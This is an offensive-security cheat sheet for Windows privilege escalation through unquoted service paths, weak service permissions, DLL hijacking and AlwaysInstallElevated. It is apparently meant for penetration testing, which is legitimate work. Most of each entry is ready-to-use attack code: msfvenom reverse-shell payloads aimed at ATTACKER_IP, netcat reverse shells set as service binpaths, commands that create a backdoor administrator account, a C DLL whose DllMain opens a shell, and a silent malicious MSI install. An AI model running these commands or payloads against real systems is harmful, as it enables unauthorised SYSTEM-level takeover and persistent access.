# Windows -- Service Misconfigurations & DLL Hijacking

### Unquoted Service Path Exploitation [added: 2026-04]
- **Tags:** #UnquotedServicePath #ServiceMisconfig #PrivEsc #Windows #winPEAS #PowerUp #ServiceAbuse #PathHijack #msfvenom
- **Trigger:** winPEAS or PowerUp reports a service with an unquoted binary path containing spaces (e.g., `C:\Program Files\Vulnerable App\Service Binary\svc.exe` without quotes)
- **Prereq:** Write permission to one of the intermediate directories in the unquoted path (e.g., `C:\Program Files\Vulnerable App\`) + ability to restart the service or wait for system reboot
- **Yields:** Code execution as the service account (often NT AUTHORITY\SYSTEM or a privileged service account) when the service starts
- **Opsec:** Med
- **Context:** When a Windows service binary path contains spaces and is not enclosed in quotes, Windows tries to resolve the path by testing each space as a potential filename terminator. For path `C:\Program Files\Vulnerable App\svc.exe`, Windows tries `C:\Program.exe`, then `C:\Program Files\Vulnerable.exe`, then the full path. If you can write to any of those intermediate locations, you can drop a malicious binary that runs as the service user. Common on legacy enterprise software installations.
- **Payload/Method:**
```powershell
# Enumerate unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Or via sc
sc qc VulnerableServiceName

# Or with PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Get-UnquotedService

# Check write permissions on intermediate directories
icacls "C:\Program Files\Vulnerable App\"

# Generate payload (on attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe

# Drop payload in the exploitable path
copy .\Vulnerable.exe "C:\Program Files\Vulnerable.exe"

# Restart the service (if you have permission)
sc stop VulnerableServiceName
sc start VulnerableServiceName

# Or if you cannot restart, wait for reboot (check start mode)
sc qc VulnerableServiceName | findstr START_TYPE
# AUTO_START means it runs on boot
shutdown /r /t 0
```

### Weak Service Permissions (Service Binary/Config Overwrite) [added: 2026-04]
- **Tags:** #WeakServicePermissions #ServiceAbuse #PrivEsc #Windows #accesschk #PowerUp #winPEAS #ScConfig #BinpathAbuse #ServiceOverwrite
- **Trigger:** accesschk, winPEAS, or PowerUp reports a service where your current user or group has SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, or WRITE_DAC on the service object -- or WRITE permission on the service binary itself
- **Prereq:** User has modify permissions on the service configuration (sc config access) or write access to the service binary file + ability to restart the service
- **Yields:** Command execution as the service account (typically SYSTEM) by replacing the service binary or changing the binpath to a malicious command
- **Opsec:** Med
- **Context:** Two distinct attack paths: (1) If you can modify the service configuration via `sc config`, change the `binpath` to execute an arbitrary command. (2) If you have write access to the actual service binary on disk, replace it with a malicious executable. Both result in code execution when the service restarts. Check with accesschk for service-level permissions and icacls for file-level permissions.
- **Payload/Method:**
```powershell
# METHOD 1: Service configuration abuse (sc config binpath)

# Enumerate modifiable services with accesschk (Sysinternals)
.\accesschk64.exe /accepteula -uwcqv "Everyone" * -s
.\accesschk64.exe /accepteula -uwcqv "BUILTIN\Users" * -s
.\accesschk64.exe /accepteula -uwcqv "NT AUTHORITY\Authenticated Users" * -s

# Or with PowerUp
Import-Module .\PowerUp.ps1
Get-ModifiableService

# Change service binary path to a reverse shell command
sc config VulnService binpath= "cmd /c c:\temp\nc.exe -e cmd.exe ATTACKER_IP 4444"

# Or add a local admin
sc config VulnService binpath= "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"

# Restart the service
sc stop VulnService
sc start VulnService

# METHOD 2: Service binary replacement

# Check file permissions
icacls "C:\Program Files\VulnApp\service.exe"
# Look for: BUILTIN\Users:(F) or (M) or (W)

# Backup original and replace
copy "C:\Program Files\VulnApp\service.exe" "C:\Program Files\VulnApp\service.exe.bak"
copy .\malicious.exe "C:\Program Files\VulnApp\service.exe"

# Restart and catch shell
sc stop VulnService
sc start VulnService
```

### DLL Hijacking via Missing DLL [added: 2026-04]
- **Tags:** #DLLHijacking #MissingDLL #DLLSearchOrder #PrivEsc #Windows #ProcMon #msfvenom #winPEAS #SideLoading #LoadLibrary
- **Trigger:** Process Monitor (procmon) shows a service or privileged application searching for a DLL with "NAME NOT FOUND" result, or winPEAS reports writable directories in the system PATH
- **Prereq:** Identified a missing DLL that a privileged process attempts to load + write access to a directory in the DLL search order before the legitimate DLL (or the DLL does not exist anywhere) + ability to trigger the DLL load (service restart, user action, or scheduled task)
- **Yields:** Code execution in the context of the process loading the DLL (SYSTEM if loaded by a service, or target user's context)
- **Opsec:** Med
- **Context:** Windows DLL search order: (1) application directory, (2) system directory, (3) 16-bit system dir, (4) Windows directory, (5) current directory, (6) PATH directories. If a service tries to load a DLL that does not exist, or you can write to a directory searched before the legitimate DLL location, you can place a malicious DLL that executes your code. Use procmon with filters for "NAME NOT FOUND" + "Path ends with .dll" to find candidates. Common in enterprise software that loads optional plugin DLLs.
- **Payload/Method:**
```powershell
# STEP 1: Identify missing DLLs with Process Monitor (procmon)
# Filter: Result = NAME NOT FOUND, Path ends with .dll
# Look for services running as SYSTEM loading non-existent DLLs

# STEP 2: Verify write permissions on the target directory
icacls "C:\Program Files\VulnApp\"

# STEP 3: Generate malicious DLL (on attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijacked.dll

# For a DLL that must export specific functions, use a proxy DLL:
# Compile a C DLL that forwards exports to the real DLL and adds malicious code in DllMain
```
```c
// Minimal malicious DLL skeleton (DllMain executes on load)
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd /c c:\\temp\\nc.exe -e cmd.exe ATTACKER_IP 4444");
    }
    return TRUE;
}
// Compile: x86_64-w64-mingw32-gcc -shared -o hijacked.dll malicious.c
```
```powershell
# STEP 4: Drop the DLL and trigger the load
copy .\hijacked.dll "C:\Program Files\VulnApp\missing.dll"

# Restart the vulnerable service
sc stop VulnService
sc start VulnService

# Or wait for the scheduled task / next user login to trigger load
```

### AlwaysInstallElevated (MSI Privilege Escalation) [added: 2026-04]
- **Tags:** #AlwaysInstallElevated #MSI #PrivEsc #Windows #msfvenom #msiexec #winPEAS #PowerUp #GroupPolicy #RegistryAbuse
- **Trigger:** winPEAS, PowerUp, or manual registry check reveals AlwaysInstallElevated is set to 1 in both HKLM and HKCU registry hives
- **Prereq:** AlwaysInstallElevated = 1 in BOTH `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` AND `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` + ability to run msiexec
- **Yields:** Command execution as NT AUTHORITY\SYSTEM by installing a crafted MSI package, since the policy forces all MSI installations to run with elevated privileges
- **Opsec:** Low
- **Context:** AlwaysInstallElevated is a Windows Group Policy setting that allows any user to install MSI packages with SYSTEM privileges. When enabled in both HKLM and HKCU, any user can craft a malicious .msi and run it to get SYSTEM. This is a common misconfiguration in enterprise environments where admins enable it so users can install approved software, not realizing it applies to ALL .msi files. Quick win -- always check this early in local privesc enumeration.
- **Payload/Method:**
```powershell
# Check if AlwaysInstallElevated is enabled (BOTH must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Or with PowerUp
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```
```bash
# Generate malicious MSI on attacker machine

# Reverse shell MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# Or add-user MSI
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
```
```powershell
# Install the malicious MSI on target (runs as SYSTEM)
msiexec /quiet /qn /i c:\temp\evil.msi

# /quiet = suppress UI
# /qn    = no UI at all
# /i     = install

# Verify escalation
net user hacker
net localgroup administrators
```
